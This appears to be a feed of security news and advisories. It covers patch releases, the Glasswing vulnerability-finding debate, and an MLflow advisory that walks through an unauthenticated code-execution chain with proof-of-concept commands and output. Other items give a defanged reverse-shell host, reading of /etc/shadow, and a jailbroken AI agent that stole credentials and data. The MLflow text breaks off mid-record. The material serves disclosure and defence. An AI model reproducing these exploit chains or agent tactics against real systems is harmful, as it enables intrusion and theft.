The researcher added that since his last analysis of Glasswing vulnerability findings in September, Anthropic had added 4613 vulnerability findings to its ledger, yet only 15 were marked as fixed within the same period. A significant volume of findings added to the ledger between September and November (1668) were marked as duplicates.

This led the researcher to question Anthropic’s latest claimed true positive rate of 94.2%, which, he said, raises “questions about how it accounts for duplicates and withdrawn findings.”

Read more: Anthropic Expands Mythos Access to 150 More Organizations

Anthropic Launched OSS Scanner to Scale Vulnerability Disclosures

One reason that could explain the gap between the vulnerabilities claimed to be found through Glasswing and vulnerabilities publicly fixed is the pace of human vulnerability report triage.

On October 8, Anthropic said it had found more than 29,000 candidate vulnerabilities but had manually reviewed only about 6000, and that it remains "bottlenecked on our human capacity to validate these findings."

“We are working on scaling our vulnerability disclosures,” the company added.

Therefore, it launched its own Open Source Security Scanner (OSS Scanner), a self-service new tool inspired by Google's OSS-Fuzz project and that allows maintainers to request a scan and triage the findings themselves.

Anthropic also said it has already sent nearly 5000 unverified vulnerability reports directly to maintainers who asked to receive everything in bulk.

This new shift in Project Glasswing started showing issues in AI-powered vulnerability reports more clearly.

For instance, Daniel Stenberg, maintainer of the Client and URL (cURL) project, said on November 6 he received 45 vulnerability reports from Anthropic through Glasswing.

After analyzing 34 of them using Anthropic OSS Scanner and other tools, Stenberg pointed out that 19 weren't vulnerabilities at all and six have been confirmed as low severity.

“AI is a valuable tool for finding vulnerabilities, and I'm not discounting that. But seven months in, the evidence still doesn't match the launch narrative. The CVEs are a sliver of this year's total, almost none are being exploited, fixes have stalled while duplicates and withdrawals pile up, and the triage burden is shifting onto the open source maintainers Glasswing promised to help. The receipts keep coming in. They still don't reconcile,” Garrity concluded.

Infosecurity contacted Anthropic for comment, but the company had not responded by the time of publication.

Image credits: Stockinq / gguy / Shutterstock.com

Read now: How Industry Coalitions Are Rallying to Secure Open Source Software for the AI Era

Vulnerabilities & Patching.title: Critical Zoom Workplace Flaw Could Allow Unauthenticated Remote Privilege Escalation
Vulnerabilities & Patching.context: Zoom has released software updates to address two security flaws impacting Zoom Workplace for Windows, including a critical bug that could result in privilege escalation on...
Vulnerabilities & Patching.full_text:
Zoom has released software updates to address two security flaws impacting Zoom Workplace for Windows, including a critical bug that could result in privilege escalation on affected systems.

The vulnerabilities are listed below -

CVE-2026-108186 (CVSS score: 9.6) - An improper input validation vulnerability that could allow an unauthenticated user to conduct an escalation of privilege via network access.

CVE-2026-108187 (CVSS score: 8.1) - An origin validation vulnerability that could allow an unauthenticated user to conduct an escalation of privilege via network access.

Successful exploitation of either of the shortcomings could permit remote attackers to escalate privileges without requiring any special permissions or access.

While CVE-2026-108187 affects Zoom Workplace for Windows before version 7.1.5, CVE-2026-108186 impacts versions starting from 7.1.0 and before 7.1.8.

Earlier this July, the popular videoconferencing platform shipped fixes for another improper input validation flaw impacting Zoom Workplace for Windows (CVE-2026-53412, CVSS score: 9.8) that could enable an unauthenticated user to take control of accounts.

Although Zoom makes no mention of the vulnerabilities being exploited in the wild, users are advised to apply the latest patches to mitigate potential threats.

Vulnerabilities & Patching.full_text:
Threat actors have been observed targeting Qlik Sense servers to unsuccessfully deliver PowerShell reverse shell commands against multiple environments in October 2026.

Cynet's CyOps and Research teams said they identified the suspicious activity in October 2026 against several E.U.-based customers within a narrow window of just over three minutes.

The activity has been found to share some level of overlap with a November 2023 campaign documented by Arctic Wolf in which threat actors linked to the CACTUS ransomware operation likely weaponized then-newly-disclosed flaws in Qlik Sense to obtain initial access to target environments.

The vulnerabilities in question, which were patched by Qlik Sense in August and September 2023, impact Qlik Sense Enterprise for Windows -

CVE-2023-41265 (CVSS score: 9.6) - An HTTP tunneling vulnerability that could lead to privilege escalation and allow an attacker to execute HTTP requests on the backend server hosting the repository application.

CVE-2023-41266 (CVSS score: 8.2) - A path traversal vulnerability that could allow an unauthenticated remote attacker to generate an anonymous session and perform HTTP requests to unauthorized endpoints.

CVE-2023-48365 (CVSS score: 9.6) - An unauthenticated remote code execution vulnerability that stems from improper validation of HTTP headers, allowing an attacker to elevate their privilege by tunneling HTTP requests and execute HTTP requests on the backend server.

It's worth noting that CVE-2023-48365 (aka DoubleQlik) is an incomplete fix for CVE-2023-41265.

In November 2023 CACTUS ransomware campaign, threat actors were observed exploiting the flaws to establish a foothold and download additional payloads to establish persistence and remote control by deploying ManageEngine Unified Endpoint Management and Security (UEMS), AnyDesk, and Plink.

The latest activity detected by Cynet involves the use of a PowerShell command containing a one-line reverse shell that connects to "45.115.26[.]23" on port 4455. The exact vulnerability exploited to break into Qlik Sense servers is currently not known.

"The command was executed under scheduler.exe, resembling the 2023 Cactus Qlik intrusions," the cybersecurity company said.

Although attempts to spawn the reverse shell were blocked, Cynet's testing of the reverse shell in a controlled environment has revealed that the interactive communication channel is used to conduct reconnaissance and deliver a PowerShell script for enabling persistence.

This is achieved by means of a Windows Go reverse shell that connects to "45.115.26[.]23:4456." The backdoor is then used to look for actively running processes related to Apache ActiveMQ. On Linux, the malware also attempts to collect system information and read "/etc/shadow" and "/etc/passwd" files.

A second variant of the PowerShell script attempts to install OpenSSH and creates a scheduled task named "WinUpdCheck" that launches a PowerShell reverse shell written to "C:\ProgramData\ssh\winc.ps1" at five-minute intervals.

"If sshd remained unavailable, it downloaded OpenSSH-Win64.zip from the staging server, extracted it, and ran install-sshd.ps1," Cynet said. "It set sshd to automatic startup, started the service, and added an inbound firewall rule for TCP 22. The archive was a legitimate OpenSSH package reused by the operator."

Further analysis of the infrastructure has uncovered an exposed directory ("45.115.26[.]23:8012") consisting of a custom Go backdoor for Windows, SSH persistence scripts, an ActiveMQ exploit for CVE-2023-46604, and a modified public Veeam toolchain for CVE-2024-40711, indicating the threat actor is possibly laying the groundwork for broader attacks.

Vulnerabilities & Patching.title: Microsoft Patch Tuesday fixes Outlook flaw already under attack
Vulnerabilities & Patching.context: We’ll start with CVE-2026-124194, an Outlook vulnerability that attackers are already exploiting
Vulnerabilities & Patching.full_text:
Microsoft’s November Patch Tuesday fixes more than 1,000 Microsoft vulnerabilities, including an Outlook flaw that attackers are already exploiting to steal authentication information.

The release also fixes 48 critical remote code execution (RCE) vulnerabilities that could allow attackers to run code on affected machines, in some cases without user interaction.

While Windows updates address many of this month’s vulnerabilities, readers should check for Office updates as well: the exploited Outlook flaw is patched through the affected Office products.

To do this, follow these instructions:

Open an Office application, such as Word.

Go to File > Account. In Outlook, this may appear as Office Account.

Under Product Information, select Update Options > Update Now.

If necessary, select Enable Updates first. If the update controls are missing on a work device, contact your organization’s IT team; updates may be centrally managed.

During the update, you may be prompted to save your work (check your open documents). Afterward, you should see something similar to this:

Office updates installed

How to apply Windows patches and check if you’re protected

These updates fix security problems and help keep your Windows PC protected. Here’s how to make sure you’re up to date:

Click the Start button, then open Settings.

Select Windows Update (usually at the bottom of the menu on the left).

Click Check for updates. Windows will search for the latest security updates. If you’ve enabled Get the latest updates as soon as they’re available under More options, you may be prompted to restart immediately to complete the update.

You may find the update (Security Update KB5132061) already installed.

Windows Update history

If updates are available, they’ll start downloading automatically. When they’re ready, click Install or Restart now if prompted. Your computer may need a restart to finish the update.

After restarting, go back to Windows Update and check again. If it says You’re up to date, you’re all set.

Technical details

As usual, we’ve selected a few vulnerabilities to highlight for readers interested in the technical details.

We’ll start with CVE-2026-124194, an Outlook vulnerability that attackers are already exploiting. It has a CVSS score of 6.5 out of 10 and could expose authentication information that attackers could use to impersonate the user. From Microsoft’s description:

“Product ui does not warn user of unsafe actions in Microsoft Office Outlook allows an unauthorized attacker to perform spoofing over a network.”

To exploit this vulnerability, an attacker must convince someone to open a specially crafted message file in an affected version of Outlook. This can cause Outlook to connect to an attacker-controlled network location without its usual external-content warning, potentially exposing authentication information (the user’s NTLMv2 hash) that could be used to impersonate them.

As this vulnerability is being exploited in the wild, updating Office as described earlier is a priority.

One other vulnerability I want to highlight is CVE-2026-116928 (CVSS score 9.8 out of 10):

“Out-of-bounds write in Microsoft Windows Search Component allows an unauthorized attacker to execute code over a network.”

An out-of-bounds write vulnerability allows a program to write outside the memory boundaries it is supposed to use, which can lead to memory corruption or place malicious code in memory and trick the system into running it.

Microsoft describes an attack in which a malicious email attachment is processed automatically for indexing by Exchange Server. In that scenario, the recipient does not need to open the email or attachment. Processing it could be enough to let the attacker run code with the permissions of the affected service. Microsoft has not reported exploitation of this vulnerability.

From reporting threats to removing them.

Cybersecurity risks should never spread beyond a headline. Keep threats off your devices by downloading Malwarebytes today.

{ "affected": [ { "package": { "ecosystem": "PyPI", "name": "mlflow" }, "ranges": [ { "events": [ { "introduced": "3.12.0rc0" }, { "fixed": "3.17.0" } ], "type": "ECOSYSTEM" } ] } ], "aliases": [ "CVE-2026-116692" ], "database_specific": { "cwe_ids": [ "CWE-470", "CWE-94" ], "github_reviewed": true, "github_reviewed_at": "2026-10-27T21:26:32Z", "nvd_published_at": null, "severity": "CRITICAL" }, "details": "## Summary MLflow 3.12.0 introduced registration and deserialization support for third-party scorers in OSS MLflow. During scorer deserialization, the server accepts a request-controlled Python module path beneath one of four allowed package prefixes, imports that module, obtains a request-controlled class, and instantiates it synchronously. An HTTP caller can combine this behavior with MLflow's built-in experiment, run, and artifact-upload endpoints: 1. Create an experiment whose local artifact location points to a writable allowed scorer package. 2. Create a run, causing MLflow to allocate `//artifacts/`. 3. Upload a Python module into that run artifact directory. 4. Submit a serialized third-party scorer whose module path resolves to the uploaded file. 5. Trigger server-side import and class construction through `/ajax-api/3.0/mlflow/scorer/invoke`. On the default no-auth server using the official MLflow v3.14.0 image, this produces unauthenticated arbitrary Python code execution with the privileges of the MLflow server process. The reproduced image runs the process as uid 0 and permits writes to its installed Python package tree. The attached proof of concept is intentionally harmless. The uploaded constructor performs one action only: it writes a random marker beside its own uploaded run artifact. The marker is then downloaded through MLflow's run-artifact endpoint and checked for an exact match. ## Technical details ### 1. The allow-list accepts attacker-created descendants At release commit `86cd7f5a1dc25a1387ad07c87811bbc30f62951c`, `mlflow/genai/scorers/scorer_utils.py` defines these allowed roots: ```python THIRD_PARTY_SCORER_ALLOWED_MODULES = frozenset({ "mlflow.genai.scorers.ragas", "mlflow.genai.scorers.deepeval", "mlflow.genai.scorers.trulens", "mlflow.genai.scorers.phoenix", }) ``` In `mlflow/genai/scorers/base.py`, the deserializer accepts either an exact root or any descendant: ```python module_path == m or module_path.startswith(m + ".") ``` It then performs the following operations using request-controlled values: ```python module = importlib.import_module(module_path) scorer_class = getattr(module, class_name, None) scorer_instance = scorer_class(**init_kwargs) ``` A package-name prefix is not a provenance boundary. If the server process can write below an allowed package, an attacker-created descendant can satisfy the string-prefix check and become importable Python code. Relevant source locations at the v3.14.0 release commit: * `mlflow/genai/scorers/scorer_utils.py`, allowed third-party scorer modules * `mlflow/genai/scorers/base.py`, third-party scorer deserialization and construction ### 2. Deserialization occurs before trace processing In `mlflow/server/handlers.py`, `_invoke_scorer_handler()` parses the supplied serialized scorer and calls: ```python scorer = Scorer.model_validate_json(serialized_scorer) ``` Only after deserialization and construction does the handler call: ```python batches = get_trace_batches_for_scorer(trace_ids, scorer, tracking_store) ``` The attacker-controlled constructor therefore runs before the server validates or resolves the supplied trace IDs. The minimal proof class is deliberately not a complete MLflow scorer. After its constructor writes the marker, later trace-batching logic accesses scorer attributes that the proof class does not implement. The resulting HTTP 500 occurs after code execution and does not invalidate the proof. No background job execution or special job-execution server option is required to reach the constructor. ### 3. MLflow's artifact layout places the module under the trusted prefix The experiment creation endpoint accepts an `artifact_location`. For file-backed experiments, MLflow derives each run artifact directory as: ```text //artifacts/ ``` The proof of concept selects this package directory in the official v3.14.0 image: ```text file:///usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens ``` After creating a run and uploading `audit_.py`, the resulting filesystem location is: ```text /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens//artifacts/audit_.py ``` The corresponding import path is: ```text mlflow.genai.scorers.trulens..artifacts.audit_ ``` The attack does not overwrite an existing package module. It creates a new run-scoped module in the normal file-backed artifact layout. The run ID is returned to the caller. ### 4. Authentication and authorization behavior With authentication disabled, as in the default reproduced server configuration, no credentials are required. When MLflow basic authentication is enabled, authentication still applies. However, the scorer-invocation AJAX endpoint is assigned to `validate_gateway_proxy`, which returns `True` without performing an experiment- or scorer-level resource permission check. Practical exploitation in an authenticated deployment still requires the caller to create an experiment and run and upload artifacts to them. The key authorization issue is that scorer deserialization itself is not gated by a resource-specific permission check for the supplied experiment before the import occurs. ## Proof of concept The attached reproduction is intentionally isolated: * exact official MLflow v3.14.0 image pinned by manifest digest; * Docker network disabled; * MLflow bound to container loopback; * no shell command or external callback; * no external request; * no host filesystem write; * marker created beside the uploaded run artifact; * marker retrieved through the run-artifact download endpoint; and * disposable container removed after completion. Run: ```bash ./run-official-image.sh ``` Expected output: ```text MLFLOW_VERSION=3.14.0 PACKAGE_DIR=/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens CREATE_EXPERIMENT_STATUS=200 CREATE_RUN_STATUS=200 UPLOAD_STATUS=200 INVOKE_STATUS=500 PROOF_DOWNLOAD_STATUS=200 PROOF_MATCH=1 RESULT=AFFECTED ``` The security-relevant result is: ```text PROOF_MATCH=1 RESULT=AFFECTED ``` This proves that the attacker-controlled constructor executed in the MLflow server process before the later scorer-processing failure. ## Reproduction environment * **Release:** MLflow v3.14.0 * **Release commit:** `86cd7f5a1dc25a1387ad07c87811bbc30f62951c` * **Official image:** `ghcr.io/mlflow/mlflow:v3.14.0` * **Manifest digest:** `sha256:967de3ca34b6a5751718e380a0a383eb0ce1a6f5b484f363bd0da7559117a5f8` * **Python version:** 3.10.18 * **Image-configured user:** empty * **Observed runtime user:** uid 0 * **Server bind:** `127.0.0.1:5000` * **Container network:** disabled * **Backend store:** `sqlite:////work/mlflow.db` * **Default artifact root:** `/work/artifacts` * **Authentication:** disabled * **Special job-execution option:** none Server command inside the disposable container: ```bash mlflow server \ --host 127.0.0.1 \ --port 5000 \ --backend-store-uri sqlite:////work/mlflow.db \ --default-artifact-root /work/artifacts ``` ## Affected range and source lineage The vulnerable third-party scorer deserialization behavior was introduced by commit: ```text 02eea26035b9d8e65af31e6e8f058ca195f62cdd Enable third-party scorer registration in OSS MLflow (#22634) ``` The feature is absent from v3.11.1 and first appears in v3.12.0. Runtime reproduction succeeds on v3.14.0. The relevant `mlflow/genai/scorers/base.py` content is unchanged at master commit: ```text 20858c9426a9644dfcf9545a92cbb534376779eb ``` No fixed release was identified as of 2026-07-12. ## Impact On the reproduced stock no-auth image, any network caller who can reach the tracking server can execute Python code as the MLflow process without credentials or user interaction. Successful exploitation provides confidentiality, integrity, and availability impact over all data, credentials, network access, and filesystem locations available to the MLflow server process. The stock image's runtime uid 0 increases container-level impact. Host impact still depends on the container runtime configuration, mounted paths, granted capabilities, socket exposure, and other isolation controls. In authentication-enabled deployments, exploitation requires an authenticated principal capable of creating an experiment and run and uploading artifacts. The exact chain also requires the server process to be able to write beneath one of the allowed scorer packages. This condition holds in the reproduced official image and may hold in virtual environments installed and run by the same operating-system user. A read-only container filesystem or a scorer package directory owned by a different, non-writable user blocks this exact placement chain. ## Artifacts and attachments ### Remote proof-of-concept script POC Script: [new_remote_poc.py](https://github.com/user-attachments/files/29936616/new_remote_poc.py) The remote proof of concept was then executed as follows. The disposable machine’s public IP has been redacted: ```bash python3 new_remote_poc.py \ --target http:// \ --package-dir /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens \ --acknowledge-owned-target I_OWN_THIS_TARGET ``` The complete sanitized output was: ```text TARGET=http:// VERSION_STATUS=200 MLFLOW_VERSION=3.14.0 CREATE_EXPERIMENT_STATUS=200 EXPERIMENT_ID=2 CREATE_RUN_STATUS=200 RUN_ID=9a2d665eb38940b68983f0586f623115 UPLOAD_STATUS=200 IMPORT_PATH=mlflow.genai.scorers.trulens.9a2d665eb38940b68983f0586f623115.artifacts.audit_1783843760683972103 INVOKE_STATUS=500 INVOKE_RESPONSE_PREVIEW='\n\n500 Internal Server Error\n

Internal Server Error

\n

The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.

\n' PROOF_DOWNLOAD_STATUS=200 EXPECTED_MARKER_SHA256=7a423b479df3524567fdf8cc3e7f6c4bfccc577fbcc4bac9519db8bd1cc61ed5 PROOF_MATCH=1 SERVER_CLEANUP_PATH=/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/9a2d665eb38940b68983f0586f623115 PROOF_OUTPUT_BEGIN { "cwd": "/", "machine": "x86_64", "marker": "MLFLOW_REMOTE_SAFE_MARKER_1783843760683972103", "os_release": "PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"11\"\nVERSION=\"11 "whoami_returncode": 0, "whoami_stderr": "" } PROOF_OUTPUT_END RESULT=AFFECTED EXPERIMENT_METADATA_CLEANUP_STATUS=200 CLEANUP_NOTE=discard the temporary test instance or remove SERVER_CLEANUP_PATH on Vulnerabilities & Patching.title: Microsoft Fixes 1235 Flaws in Another Record Patch Tuesday
Vulnerabilities & Patching.context: The zero-day vulnerability is CVE-2026-124194, a spoofing bug in Microsoft Outlook, exploited in attacks to steal NTLM account hashes
Vulnerabilities & Patching.full_text:
Microsoft has issued updates to fix over 1200 vulnerabilities in its products, a new record.

The tech giant’s November Patch Tuesday contained fixes for 1235 flaws, including one zero-day being actively exploited in the wild.

It makes this month the fourth this year in which Microsoft has issued a record number of patches, following previous milestones passed in July, September and October.

The zero-day vulnerability is CVE-2026-124194, a spoofing bug in Microsoft Outlook, exploited in attacks to steal NTLM account hashes.

“An attacker sends a specially crafted message file and gets the user to open it. Outlook then connects to a network location the attacker controls, but it skips the usual warning about external content,” explained Action1 director of vulnerability research, Jack Bicer.

“That quiet connection can leak the user's NTLMv2 hash, a scrambled form of their login secret, which the attacker can use to sign in as that person. It affects Microsoft 365 Apps for Enterprise and Office LTSC 2021 and 2024.”

Read more on patching: Exploited Vulnerabilities Typically Take Three Months to Patch, Moody’s Finds

Although the zero-day is rated “moderate,” sysadmins should prioritize it, Bicer advised.

“Attackers are already exploiting it, it needs only one click on an email file, and it hits Outlook, which nearly every organization runs,” he added. “A stolen hash can open doors far beyond the inbox. Push the Office update to every Outlook user now, starting with administrators and high-value accounts.”

The majority (536) of CVEs patched this month are elevation of privilege (EoP), followed by remote code execution (296) and information disclosure (157).

A total of 66 are rated critical, most of these being remote code execution flaws.

SAP Patch Volumes Hit New Highs

Microsoft wasn’t the only software giant to release a record-breaking number of security updates yesterday. SAP’s November Patch Day was the biggest ever, with 43 vulnerabilities addressed, including 12 Hot News Notes and 13 High Priority.

“Hot News” is the highest priority ranking given to SAP security updates (Notes).

The patch load was twice the size of the average for 2026 and included four with a maximum CVSS score of 10.0, according to Onapsis.

These were:

CVE-2026-89103 (SAP Security Note #3798345), a broken access control vulnerability in SAP Gateway dubbed “ProxyGate”

CVE-2026-76964 (SAP Security Note #3778530), a memory corruption flaw in SAP NetWeaver AS ABAP (Internet Communication Manager)

CVE-2026-89126 (SAP Security Note #3778556), a memory corruption vulnerability in SAP Web Dispatcher

CVE-2026-120017 (SAP Security Note #3849308), a missing authentication (SAML2 authentication bypass) vulnerability in SAP NetWeaver AS ABAP and ABAP Platform (SAML2 Service Provider)

Vulnerabilities & Patching.title: Microsoft Patches 1,259 Flaws, Including Exploited Outlook Bug That May Expose NTLMv2 Hashes
Vulnerabilities & Patching.context: Attackers are already exploiting it, it needs only one click on an email file, and it hits Outlook, which nearly every organization runs
Vulnerabilities & Patching.full_text:
Microsoft on Tuesday released patches for a total of 1,259 vulnerabilities spanning its software portfolio, the second consecutive month where the patch volume has exceeded 1,000 flaws.

These cover 726 flaws in Windows, 174 in Office, 61 in Developer Tools, 59 in SQL Server, 53 in Developer Tools, and 27 in SharePoint Server. The patches also include 165 non-Microsoft-issued CVE identifiers. More than 500 flaws relate to elevation of privilege, followed by remote code execution and information disclosure bugs.

With the latest round of fixes, Microsoft has addressed over 5,100 CVEs this year alone, according to Satnam Narang, senior staff research engineer at Tenable.

Of these, a Moderate-severity security flaw in Microsoft Outlook (CVE-2026-124194, CVSS score: 6.5) has been flagged as actively exploited by Microsoft.

"Product UI does not warn users of unsafe actions in Microsoft Office Outlook allows an unauthorized attacker to perform spoofing over a network," Microsoft said in an advisory.

An unauthenticated attacker could send a specially crafted message file and persuade a target to open it in an affected version of Microsoft Outlook.

This, in turn, could cause Outlook to connect to an attacker-controlled network location without displaying the usual external-content warning, potentially disclosing authentication information, such as an NTLMv2 hash, that could be used to impersonate the user.

Microsoft emphasized that successful exploitation requires network connectivity and user interaction. The tech giant credited a researcher named Nono and Anthropic's Benoît Sevens (using Claude) with discovering and reporting the flaw.

"Email is the easiest door into any company, and this flaw turns one opened file into a stolen identity," Jack Bicer, director of vulnerability research at Action1, said. "A captured hash can let an attacker sign in as the victim, read their data, and move to other systems they can reach."

"The Moderate label undersells this one. Attackers are already exploiting it, it needs only one click on an email file, and it hits Outlook, which nearly every organization runs. A stolen hash can open doors far beyond the inbox."

That said, Redmond has not attributed the activity to a particular threat actor or provided technical details on how the vulnerability is being exploited in the wild. The advisory also doesn't spell out whether the discovery came before or after attackers began exploiting the flaw.

The development has prompted the U.S. U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add the flaw to its Known Exploited Vulnerabilities (KEV) catalog, requiring federal agencies to apply the fix by November 24, 2026.

Some other vulnerabilities of note include a number of remote code execution flaws impacting Windows Search (CVE-2026-116928), Lightweight Directory Access Protocol (CVE-2026-119958), Windows Schannel (CVE-2026-119952), Windows Virtual Filtering Platform (CVE-2026-95962), and Windows Xbox Live Networking Service (CVE-2026-112967), as well as a privilege escalation flaw in Azure OpenAI (CVE-2026-119990).

"Most security teams haven't quite recovered from the last month of bumper-to-bumper critical vulnerabilities, emergency patches, and '2shell'-branded everything, and we're yet again at another Patch Tuesday," Jake Knott, head of threat intelligence at watchTowr, said.

"Teams are really starting to feel the strain of working out 'what actually matters?' when there is fire after fire every day demanding immediate attention. Start with what you actually have exposed to the Internet, then what’s already being exploited in the wild, and only then everything else. Before going into panic mode, check whether you even use the vulnerable component, or meet the prerequisites for exploitation."

Vulnerabilities & Patching.title: Cisco BroadWorks and Openwave Flaws Actively Exploited Despite Available Patches
Vulnerabilities & Patching.context: (Fixed in October 2026) The addition of CVE-2026-111793 to the KEV catalog follows an alert issued by Japan Vulnerability Notes (JPN), which noted in an advisory that the...
Vulnerabilities & Patching.full_text:
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) Tuesday added two security flaws impacting Cisco BroadWorks and Openwave Messaging Webtop Media Transcoder to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation.

Details of the vulnerabilities are below -

CVE-2026-20320 (CVSS score: 7.5) - An improper restriction of XML external entity reference vulnerability in the Open Client Interface (OCI) XML Parser of Cisco BroadWorks that could allow an unauthenticated, remote attacker to read sensitive configuration information on an affected system with the privileges of the Cisco BroadWorks user. (Fixed in August 2026)

CVE-2026-111793 (CVSS score: 4.3) - An incorrect resource transfer between spheres vulnerability in Openwave Messaging Webtop Media Transcoder that could allow an authenticated user to process and convert unintended document types if bypassing the Webmail experience. (Fixed in October 2026)

The addition of CVE-2026-111793 to the KEV catalog follows an alert issued by Japan Vulnerability Notes (JPN), which noted in an advisory that the "developer states that attacks exploiting the vulnerability have been observed."

The vulnerability information portal also warned that an authenticated attacker could exploit the vulnerability to upload a specially crafted file and obtain sensitive information.

As for CVE-2026-20320, the security defect has been put to use as part of an agentic attack campaign dubbed Operation Snowball in which an unknown Chinese-speaking threat actor leveraged an autonomous framework built using a jailbroken version of the DeepSeek Flash model to target a European telecom provider and 13 companies hosted on its infrastructure.

The activity resulted in the enumeration of hundreds of assets, extraction of dozens of credential sets, and exfiltration of thousands of rows of subscriber billing and device records from the provider's internal billing platform over a two-week period, according to Malbear Labs.

The AI agent has capabilities to exploit a portfolio of known security vulnerabilities spanning a wide range of products, including -

JBoss RichFaces (CVE-2013-2165)

Liferay CE/DXP (CVE-2020-7961)

ForgeRock OpenAM (CVE-2021-35464)

Linux (CVE-2021-4034)

SAP NetWeaver (CVE-2022-22536)

Cisco Expressway (CVE-2023-20269)

Citrix NetScaler(CVE-2023-4966)

Qlik Sense (CVE-2023-41265, CVE-2023-41266)

PAN-OS GlobalProtect (CVE-2024-3400, CVE-2024-9474)

Adobe Experience Manager (CVE-2025-54249)

Broadcom VMware Cloud Director (CVE-2026-2003, CVE-2026-2004, CVE-2026-2005, CVE-2026-2006)

Claris FileMaker Server (CVE-2026-86934), and

F5 BIG-IP (CVE-2026-41225)

"The primary target on the telecommunications provider's infrastructure was the BroadWorks XSP (eXtended Services Platform), Release 23.0.1.1075, running on port 2208," Malbear Labs said. "The agent exploited CVE-2026-20320, an unauthenticated XXE in the BroadWorks OCI XML parser."

"From the XSP host, the agent recovered the system identity private key, three SSL credential sets, and three additional private keys with certificate matches confirmed. The system identity key is used by the BroadWorks platform to authenticate between its own components; possessing it allows impersonation of the XSP in inter-component communication."

The activity has also been characterized by the use of reconnaissance tools, Sliver for post-exploitation, Chisel, along with web shells like Behinder for persistent access.

"This is a threat actor who delegated the intrusion to an AI and checked in asynchronously to review progress," Malbear Labs added. The primary agent ran continuously, issued parallel tasks to worker agents, maintained a coherent operational plan across the full campaign, and adapted to defensive controls without pausing for operator input."

"The harness ran the reconnaissance, identified the attack surface, chose the exploitation path, adapted when controls blocked it, wrote new tools when existing ones failed, extracted credentials, exfiltrated data, and compiled a finished target list, all without the operator present during any of it."

Late last month, Cisco revealed that two different vulnerabilities in Catalyst SD-WAN (CVE-2026-20127, CVSS score: 10.0) Secure Firewall Adaptive Security Appliance (ASA) Software and Secure Firewall Threat Defense (FTD) Software (CVE-2026-76418, CVSS score: 8.6) have been actively exploited in the wild.

In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies are recommended to apply the patches by November 24, 2026, to secure their networks.

Vulnerabilities & Patching.title: ZDI-26-953: (0Day) Meta FAIRChem utils load_inference_model Deserialization of Untrusted Data Remote Code Execution Vulnerability
Vulnerabilities & Patching.context: Vulnerability Details This vulnerability allows remote attackers to execute arbitrary code on affected installations of Meta FAIRChem
Vulnerabilities & Patching.full_text:
Vulnerability Details

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Meta FAIRChem. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of checkpoint files. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the current process.

Additional Details

-- Mitigation: Given the nature of the vulnerability, the only salient mitigation strategy is to restrict interaction with the product

Disclosure Timeline

Vulnerabilities & Patching.title: Able2Shell: Frequently asked questions for reported N-able N-central zero-day vulnerabilities
Vulnerabilities & Patching.context: As of November 10, there are no details available for any threat actor activity connected to Able2Shell exploitation
Vulnerabilities & Patching.full_text:
N-able released a hotfix for N-central that fixes seven CVEs after a researcher published proof-of-concept code for 33 alleged zero-day vulnerabilities. The researcher says one attack chain needs no credentials.

Key Takeaways

Able2Shell is a set of 33 alleged vulnerabilities in N-able N-central, published with proof-of-concept code. The researcher says one chain lets an unauthenticated attacker run commands on the server.

Security firms report exploitation attempts against N-central honeypots, but as of November 10, no confirmed compromise of a customer server has been reported.

N-able released N-central 2026.4 Hotfix 2 on November 10. It fixes seven CVEs.

Background

Tenable's Research Special Operations (RSO) team has compiled this blog to answer Frequently Asked Questions (FAQ) regarding Able2Shell, a set of reported zero-day vulnerabilities in N-able N-central.

FAQ

When was Able2Shell first disclosed?

A researcher operating under the GitHub account “Oracle-Security” published a write-up titled “Able2Shell” in the account’s CVEs repository. It describes 33 alleged N-central vulnerabilities with proof-of-concept code. The earliest README commit is dated November 9, 2026 at 04:14 UTC. N-able described the release as a public disclosure by an independent security researcher. N-able does not state whether it was notified in advance and does not name the researcher.

What are the vulnerabilities associated with Able2Shell?

On November 10, N-able published seven CVE records for vulnerabilities fixed in N-central 2026.4 Hotfix 2. On its status page, N-able says the release addresses “the most critical November 9 vulnerabilities” and that a follow-up hotfix will provide further security updates. The page lists all seven as related CVEs. One, CVE-2026-91000, had been reserved on September 14, before the public Able2Shell disclosure.

CVE

Description (per N-able)

CVSSv4

CVE-2026-125883

Multiple XML external entity (XXE) vulnerabilities

9.3

CVE-2026-125881

Schema-hint server-side request forgery (SSRF) via service import schema validation

9.3

CVE-2026-125878

Multiple OGNL injection vulnerabilities

8.7

CVE-2026-125879

Local privilege escalation to root via nable-writable syslog-ng config

8.6

CVE-2026-125882

Remote code execution via file repository upload path traversal

8.6

CVE-2026-91000

Insecure IPC channels lead to local privilege escalation

8.4

CVE-2026-125880

Stored cross-site scripting (XSS) via MMS3 patch metadata (admin context)

8.3

N-able’s CVE titles match several finding types in the researcher’s README, but N-able has not said which of the 33 findings each CVE addresses. N-able credits CVE-2026-125882 to Nate Fair of Sprocket Security, and a file repository path traversal also appears in the README.

Is Able2Shell one vulnerability or several?

Several. The README lists 33 findings, and some of them are steps in longer exploit chains built from other entries on the same list. The researcher lists four exploit chains. The rest are standalone findings.

Chain

Login needed

Reaches

Service import XXE

None

Commands as the nable account

MMS3 stored XSS to OGNL execution

None to plant, but an administrator has to view it

Commands as the nable account

MMS3 stored XSS to Audit Export

None to plant, but an administrator has to view it

Commands as root

SIS file path traversal to syslog installer

Yes

Commands as root

